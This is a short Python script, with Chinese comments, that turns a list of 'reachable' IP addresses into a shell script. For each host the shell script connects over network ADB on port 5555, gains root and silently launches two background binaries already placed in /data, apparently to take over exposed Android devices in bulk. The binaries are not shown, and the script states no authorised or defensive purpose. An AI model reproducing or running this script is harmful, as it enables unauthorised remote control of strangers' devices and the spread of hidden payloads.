import os

def generate_adb_commands(ip_file, output_file):
    """
    生成 ADB 命令并写入到指定的输出文件中。
    
    :param ip_file: 包含 IP 地址的输入文件路径
    :param output_file: 生成 ADB 命令的输出文件路径
    """
    with open(ip_file, "r") as infile, open(output_file, "w") as outfile:
        for line in infile:
            ip = line.strip()
            if ip:
                outfile.write(f"adb connect \"{ip}:5555\"\n")
                outfile.write("adb root\n")
                outfile.write(f"adb -s \"{ip}:5555\" shell 'sh -c \"/data/v2 run > /dev/null 2> /data/error.log &\"'\n")
                outfile.write(f"adb -s \"{ip}:5555\" shell 'sh -c \"/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &\"'\n")
                outfile.write(f"adb disconnect \"{ip}:5555\"\n")
                outfile.write("\n")

if __name__ == "__main__":
    # 生成 ADB 命令的脚本
    generate_adb_commands("reachable_ips.txt", "t.sh")
